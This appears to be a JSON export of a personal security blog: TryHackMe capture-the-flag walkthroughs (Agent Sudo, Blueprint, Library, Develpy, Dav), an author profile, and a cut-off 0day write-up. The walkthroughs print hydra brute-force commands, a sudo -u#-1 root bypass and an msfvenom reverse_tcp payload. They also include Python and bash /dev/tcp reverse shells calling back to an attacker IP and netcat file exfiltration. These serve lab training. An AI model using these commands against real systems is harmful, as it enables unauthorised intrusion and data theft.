[{"content":" Title https://tryhackme.com/room/agentsudoctf Description You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. Difficulty Easy Maker https://tryhackme.com/p/DesKel Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 └─$ nmap -sC -sV -oA nmap/agentsudo 10.10.235.44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:57 EST Nmap scan report for 10.10.235.44 Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel There is no CVE we found from NMAP Scan.\nWebsite is giving some hint, it is saying use your codename as user-agent to access this site.\nAs the hint suggest, we have to use agent name in user-agent, so I opened burpsuite and edit user-agent as name of the agent.\nIt is saying - What are you doing! Are you one of the 25 employees? If not, I going to report this incident.\nNow, Instead of R, I tried different alphabets like A,B and so on. While testing for C we got the location, /agent_C_attention.php .\nSo the name of the agent is chris.\nNow, there is a ftp port open. So I tried to run ftp with default creds, but it didn’t work, so we have to bruteforce ftp using hydra.\n1 2 3 └─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.235.44 ftp ... [21][ftp] host: 10.10.235.44 login: chris password: crystal We found the password for chris\u0026rsquo;s ftp server, that is crystal. Let’s login into FTP and see what is inside it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ ftp chris@10.10.235.44 Connected to 10.10.235.44. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||21299|) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png 226 Directory send OK. I have downloaded the files using get \u0026lt;filename\u0026gt; from FTP. Let’s see what is in To_agentJ.txt file.\n1 2 3 4 5 6 7 └─$ cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C So, from this we got the hint that there is come kind of file inside this image. So I have used binwalk to get the data out of that image.\nbinwalk -e cutie.png → There is a zip file which contains password. So using john we can crack the password for the zip file.\n1 2 3 4 5 └─$ zip2john 8702.zip \u0026gt; hash.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash ... alien (8702.zip/To_agentR.txt) So the password for the zip file us alien.\nThe zip file contain the following information.\n1 2 3 4 5 6 7 └─$ cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;QXJlYTUx\u0026#39; as soon as possible! By, Agent R It seems like some kind of encoding, let’s try base64.\n1 2 └─$ echo QXJlYTUx | base64 -d Area51 user flag It seems Area51 is the password to decrypt data from cute-alien.jpg file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 └─$ steghide --extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. ┌──(kali㉿kali)-[~/Desktop/tryhackme/agentsudo] └─$ cat message.txt Hi james, Glad you find this message. Your login password is hackerrules! Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris The other Agent’s name is james and the password of ssh for james is hackerrules!.\n1 2 3 4 james@agent-sudo:~$ ls Alien_autospy.jpg user_flag.txt james@agent-sudo:~$ cat user_flag.txt b03d975e8c92a7c04146cfa7a5a313c7 root flag Download the file Alient_autospy.jpg using scp and reverse search in google.\n└─$ sudo scp [james@10.10.235.44](mailto:james@10.10.235.44):Alien_autospy.jpg .\nAnswer is - Roswell alien autopsy\nRoot exploit article - https://www.exploit-db.com/exploits/47502\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 james@agent-sudo:~$ sudo -l Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash james@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# cat /root/root.txt To Mr.hacker, Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is b53a02f55b57d4439e3341834d70c062 By, DesKel a.k.a Agent R ","description":"You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.","id":0,"section":"posts","tags":["TryHackMe","Bruteforce","FTP","Hydra","CVE","Steganography"],"title":"TryHackMe Writeup - Agent Sudo Room","uri":"https://g4nd1v.github.io/posts/tryhackme-agentsudo/"},{"content":" Title https://tryhackme.com/room/blueprint Description Hack into this Windows machine and escalate your privileges to Administrator. Difficulty Easy Maker https://tryhackme.com/p/MrSeth6797 Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 └─$ nmap -sC -sV -oA nmap/blueprint 10.10.28.87 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 12:33 EST Nmap scan report for 10.10.28.87 Host is up (0.15s latency). Not shown: 987 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: 404 - File or directory not found. | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_ssl-date: TLS randomness does not represent time | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 1s, median: 1s | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-02-28T17:35:00+00:00 |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:b8:60:4f:ba:87 (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-02-28T17:35:00 |_ start_date: 2024-02-28T17:27:12 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . It is using osCommerce 2.3.4 - public exploit is available for this version - https://www.exploit-db.com/exploits/44374\nroot flag Instead of using the exploit directly, I used Metasploit framework.\nStart by searching the exploit.\nset options and then run the exploit, and boom, it will give you Metasploit shell.\nNow as we got the shell, navigate to the administrator desktop and cat the root file.\n1 2 3 4 meterpreter \u0026gt; pwd C:\\Users\\Administrator\\Desktop meterpreter \u0026gt; cat root.txt.txt THM{aea1e3ce6fe7f89e10cea833ae009bee} Hashdump Now we have php shell, which is useless to get the hashdump. It will give you error when running hashdump in that shell.\n1 2 meterpreter \u0026gt; hashdump [-] The \u0026#34;hashdump\u0026#34; command requires the \u0026#34;priv\u0026#34; extension to be loaded (run: `load priv`) So what we need to do is escalate php shell into window’s shell. To do so, I have found a blog which seems to bee very helpful - https://dl.packetstormsecurity.net/papers/attack/root3.pdf and https://sckull.github.io/posts/blueprint/\nAccording to the blog, firstly generate the payload using msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; payload.exe\nThen move to system folder (cd c:\\\\windows\\\\system32) and upload the payload into php shell using upload payload.exe.\nOpen a new msfconsole and then use the following command to start window's shell.\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit Now, execute the payload using execute -f payload.exe on php shell and boom, we got the window’s shell.\nThis are the hashes\n1 2 3 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: Atlast, we can use crackstation website to crack the hash.\n","description":"Hack into this Windows machine and escalate your privileges to Administrator.","id":1,"section":"posts","tags":["TryHackMe","Meterpreter","CVE"],"title":"TryHackMe Writeup - Blueprint Room","uri":"https://g4nd1v.github.io/posts/tryhackme-blueprint/"},{"content":" Title https://tryhackme.com/room/bsidesgtlibrary Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ nmap -sC -sV -oA nmap/library 10.10.157.19 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 11:55 EST Nmap scan report for 10.10.157.19 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA) | 256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA) |_ 256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Welcome to Blog - Library Machine |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds So, there are 2 ports that are open. ssh and http. It doesnot seem to contain CVE in apache version for remote code execution.\nNext, I tried to get directories using gobuster and tried to find subdomain using ffuf , but nothing showed interesting results.\nuser flag There are 2 things that is giving some hints. Firstly, in comments of the blog, it seems to have the usernames i.e. root , www-data , meliodas , and Anonymous. Moreover, in robots.txt there is a word rockyou. So maybe I thought bruteforce SSH using hydra?\nVoila, we got the password for SSH.\n1 2 3 4 └─$ hydra -L names.txt -P /usr/share/wordlists/rockyou.txt 10.10.157.19 ssh Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). ... [22][ssh] host: 10.10.157.19 login: meliodas password: iloveyou1 root flag Upon doing sudo -l we found there is a file which we can use as sudo.\n1 2 3 4 5 6 meliodas@ubuntu:~$ sudo -l Matching Defaults entries for meliodas on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User meliodas may run the following commands on ubuntu: (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py This is the content of the file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 meliodas@ubuntu:~$ cat bak.py #!/usr/bin/env python import os import zipfile def zipdir(path, ziph): for root, dirs, files in os.walk(path): for file in files: ziph.write(os.path.join(root, file)) if __name__ == \u0026#39;__main__\u0026#39;: zipf = zipfile.ZipFile(\u0026#39;/var/backups/website.zip\u0026#39;, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) zipdir(\u0026#39;/var/www/html\u0026#39;, zipf) zipf.close() Here is the file structure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 meliodas@ubuntu:~$ ls -al total 40 drwxr-xr-x 4 meliodas meliodas 4096 Aug 24 2019 . drwxr-xr-x 3 root root 4096 Aug 23 2019 .. -rw-r--r-- 1 root root 353 Aug 23 2019 bak.py -rw------- 1 root root 44 Aug 23 2019 .bash_history -rw-r--r-- 1 meliodas meliodas 220 Aug 23 2019 .bash_logout -rw-r--r-- 1 meliodas meliodas 3771 Aug 23 2019 .bashrc drwx------ 2 meliodas meliodas 4096 Aug 23 2019 .cache drwxrwxr-x 2 meliodas meliodas 4096 Aug 23 2019 .nano -rw-r--r-- 1 meliodas meliodas 655 Aug 23 2019 .profile -rw-r--r-- 1 meliodas meliodas 0 Aug 23 2019 .sudo_as_admin_successful -rw-rw-r-- 1 meliodas meliodas 33 Aug 23 2019 user.txt Simple Solution is to remove the bak.py file and create new file and write shell there to and run it as sudo to get the root.\n1 2 3 4 5 6 meliodas@ubuntu:~$ mv bak.py bak.py.bk meliodas@ubuntu:~$ vi bak.py meliodas@ubuntu:~$ echo \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; bak.py meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py root@ubuntu:~# cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 root flag - Method #2 echo $PATH - it is using meliodas directory in the path, so we can create our rev shell in place of the library which is using in the program like zipfile.\nMore detailed explanation for Python-Library-Hijacking - https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/\n1 2 meliodas@ubuntu:~$ echo $PATH /home/meliodas/bin:/home/meliodas/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games On server\n1 2 3 4 5 6 7 meliodas@ubuntu:~$ vi zipfile.py meliodas@ubuntu:~$ cat zipfile.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.8.95.227\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); meliodas@ubuntu:~$ ls bak.py user.txt zipfile.py zipfile.pyc meliodas@ubuntu:~$ sudo python3 /home/meliodas/bak.py \u0026lt;active shell connection\u0026gt; On Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.8.95.227] from (UNKNOWN) [10.10.157.19] 50962 # whoami root # ls bak.py __pycache__ user.txt zipfile.py zipfile.pyc # cat /root/root.txt e8c8c6c256c35515d1d344ee0488c617 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":2,"section":"posts","tags":["TryHackMe","Hydra","Python-Library-Hijacking"],"title":"TryHackMe Writeup - Library Room","uri":"https://g4nd1v.github.io/posts/tryhackme-library/"},{"content":" Title https://tryhackme.com/room/bsidesgtdevelpy Description boot2root machine for FIT and bsides Guatemala CTF Difficulty Medium Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 └─$ nmap 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:52 EST Nmap scan report for 10.10.224.39 Host is up (0.096s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 10000/tcp open snet-sensor-mgmt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 └─$ nmap -n -sV --script \u0026#34;ndmp-fs-info\u0026#34; -p 10000 10.10.224.39 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:55 EST Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Stats: 0:01:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.224.39 Host is up (0.093s latency). PORT STATE SERVICE VERSION 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: So python service is running at port 10000 we can connect using nc.\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: 1 Exploit started, attacking target (tryhackme.com)... Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.064 ms Maybe a pyjail? I don’t know, let’s try!\nuser flag Bypass Python sandboxes\nVoila, it worked!\n1 2 3 4 5 6 7 8 └─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;) credentials.png exploit.py root.sh run.sh user.txt Exploit started, attacking target (tryhackme.com)... 1 2 3 4 5 6 7 8 ─$ nc 10.10.224.39 10000 Private 0days Please enther number of exploits to send??: __builtins__.__import__(\u0026#34;os\u0026#34;).system(\u0026#34;cat user.txt\u0026#34;) cf85ff769cfaaa721758949bf870b019 Exploit started, attacking target (tryhackme.com)... Connecting with rev bash shell,\nroot flag use this to get the rev shell - **builtins**.**import**(\u0026quot;os\u0026quot;).system(\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.95.227/4444 0\u0026gt;\u0026amp;1'\u0026quot;)\nWe will get the shell as king user.\nThere is a file named as credentials.png , now we have to download using nc.\n1 2 3 4 5 On your machine nc -l -p 1234 -q 1 \u0026gt; credentials.png \u0026lt; /dev/null On King\u0026#39;s machine cat credentials.png | netcat 10.8.95.227 1234 well, it does not seem like png file. I cannot be able to crack it. (Yes yes, later I have checked writeup for it!) — it was piet programming (https://www.bertnase.de/npiet/). Anyway…\nHere, we can able to read file and delete it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 king@ubuntu:~$ ls -al ls -al total 324 drwxr-xr-x 4 king king 4096 Aug 27 2019 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rw------- 1 root root 2929 Aug 27 2019 .bash_history -rw-r--r-- 1 king king 220 Aug 25 2019 .bash_logout -rw-r--r-- 1 king king 3771 Aug 25 2019 .bashrc drwx------ 2 king king 4096 Aug 25 2019 .cache -rwxrwxrwx 1 king king 272113 Aug 27 2019 credentials.png -rwxrwxrwx 1 king king 408 Aug 25 2019 exploit.py drwxrwxr-x 2 king king 4096 Aug 25 2019 .nano -rw-rw-r-- 1 king king 5 Feb 23 17:12 .pid -rw-r--r-- 1 king king 655 Aug 25 2019 .profile -rw-r--r-- 1 root root 32 Aug 25 2019 root.sh -rw-rw-r-- 1 king king 139 Aug 25 2019 run.sh -rw-r--r-- 1 king king 0 Aug 25 2019 .sudo_as_admin_successful -rw-rw-r-- 1 king king 33 Aug 27 2019 user.txt -rw-r--r-- 1 root root 183 Aug 25 2019 .wget-hsts Next thing is remove the [root.sh](http://root.sh) file and then create a new file and add reverse shell in that file.\nAnd boom we for the root!\n1 2 3 4 root@ubuntu:/home/king# cat /root/root.txt cat /root/root.txt 9c37646777a53910a347f387dce025ec root@ubuntu:/home/king# ","description":"boot2root machine for FIT and bsides Guatemala CTF","id":3,"section":"posts","tags":["TryHackMe","pyjail","cronjob"],"title":"TryHackMe Writeup - Develpy Room","uri":"https://g4nd1v.github.io/posts/tryhackme-develpy/"},{"content":" Title https://tryhackme.com/room/bsidesgtdav Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 └─$ nmap -sC -sV -oA nmap/dav 10.10.88.48 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 18:51 EST Nmap scan report for 10.10.88.48 Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . So basically only one port is open, that is 80 .\nAlso, on this port there is a default page of apache2.\nNext logical step will be to search for directories.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 └─$ gobuster dir -u 10.10.88.48 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.88.48 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 290] /.htaccess (Status: 403) [Size: 295] /.htpasswd (Status: 403) [Size: 295] /index.html (Status: 200) [Size: 11321] /server-status (Status: 403) [Size: 299] /webdav (Status: 401) [Size: 458] We found a directory named as /webdav but it is asking for username and password.\nAfter searching through internet about webdav, I found default credentials - https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html\nuser: wampp\npass: xampp\nUser flag I found a file passwd.dav on server and in that file, I found this credentials\nwampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91 but I cannot be able to crack it.\nI found a blog which is about exploiting webdav - https://vk9-sec.com/exploiting-webdav/ and uploading the rev shell using php.\n1 2 3 4 5 6 7 8 └─$ cadaver http://10.10.188.137/webdav Authentication required for webdav on server `10.10.188.137\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; ls Listing collection `/webdav/\u0026#39;: succeeded. passwd.dav 44 Aug 25 2019 dav:/webdav/\u0026gt; put php-reverse-shell.php On visiting the website, we got the shell!!\n1 2 3 4 5 6 7 8 9 10 11 $ whoami www-data $ cd /home $ ls merlin wampp $ cd merlin $ ls user.txt $ cat user.txt 449b40fe93f78a938523b7e4dcd66d2a Root flag we can use /bin/cat as sudo user.\n1 2 3 4 5 6 7 8 www-data@ubuntu:/home/merlin$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat Here is the /etc/shadow file and I have tried to use john in order to crack this hash. But it is of no use. Then I remember… we have cat as root.\nSimply reading root file will also work!\n1 2 3 www-data@ubuntu:/$ sudo cat /root/root.txt sudo cat /root/root.txt 101101ddc16b0cdf65ba0b8a7af7afa5 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":4,"section":"posts","tags":["TryHackMe","Apache","Webdav"],"title":"TryHackMe Writeup - Dav Room","uri":"https://g4nd1v.github.io/posts/tryhackme-dav/"},{"content":"I am Krishnan Navadia (g4nd1v), a passionate cybersecurity enthusiast and software developer based in NYC, USA. Currently pursuing a Master\u0026rsquo;s degree in Cybersecurity at New York University, I have a strong foundation in Information Technology from G.H. Patel College of Engineering and Technology, India.\nEducation New York University, Brooklyn, USA\nMaster of Science (MS), Cybersecurity Sept 2023 - Ongoing G.H. Patel College of Engineering and Technology, Anand, India\nBachelor of Engineering (BE), Information Technology CGPA: 9.11/10 July 2019 – May 2023 Experience WeeTech Solution Pvt Ltd., Gujarat, India Penetration Tester Intern\nJanuary 2023 – April 2023\nConducted comprehensive vulnerability assessments, identifying over 30 critical vulnerabilities. Assisted in penetration tests, resulting in a 20% boost in system security. Collaborated with teams to devise mitigation strategies, reducing threats by 25%. Frshr Technologies, Bangalore, India Software Developer Intern\nOctober 2021 – February 2022\nDeveloped REST APIs, Dashboard, and Payment system for an NFT buying/selling website. Created a cryptocurrency and stock trading simulation web app, attracting 10,000+ users in the initial month. Implemented server maintenance and NoSQL migration, reducing downtime by 40% and speeding data by 50%. Projects Fileopedia - Encrypted File Sharing System Memephile - Social Media Application BgRemover - Service made with Telegram API Trackerly - Price tracking automation Technical Skills Programming Languages: Python, C, C++, TypeScript, JavaScript, PHP, Java Frameworks, Libraries \u0026amp; Tools: React.js, Node.js, Next.js, React Native, GraphQL, Django, Flask, Git, Postman, Docker, Shell Scripting, MongoDB, MySQL, PostgreSQL, Redis Leadership and Involvement Developer, Google Developer Student Club (GDSC) Overall Co-Coordinator, IDEA Lab Developer and Logistics, Computer Science of India (CSI) and GCET Codechef Chapter Achievements Secured “2nd place” and “Best Use of API” in the “HackOdisha” hackathon. Top 3% in TryHackMe and Rank “Hacker” on HackTheBox. Designed and tested CTF challenges for CSAW’23. Notable ranks in CTF: Nahamcon’23, GoogleCTF’23, JerseyCTFIII’23. Received a merit-based $18000 scholarship for Masters at NYU. Feel free to reach out to me via email or connect on LinkedIn. You can also check out my projects on GitHub.\n","description":"Krishnan Navadia's profile showcasing his experience, projects, and achievements.","id":5,"section":"","tags":null,"title":"About Me","uri":"https://g4nd1v.github.io/about/"},{"content":"0day Title 0day Description Exploit Ubuntu, like a Turtle in a Hurricane Difficulty Medium Maker 0day Foothold 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 5720823c62aa8f4223c0b893996f499c (DSA) | 2048 4c40db32640d110cef4fb85b739bc76b (RSA) | 256 f76f78d58352a64dda213c5547b72d6d (ECDSA) |_ 256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: 0day |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From nmap, we didn\u0026rsquo;t find anything interesting, therefore let\u0026rsquo;s find the directories.\n└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://0day.thm [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/06/12 15:51:58 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] /img (Status: 301) [Size: 301] [--\u0026gt; http://0day.thm/img/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/uploads/] /admin (Status: 301) [Size: 303] [--\u0026gt; http://0day.thm/admin/] /css (Status: 301) 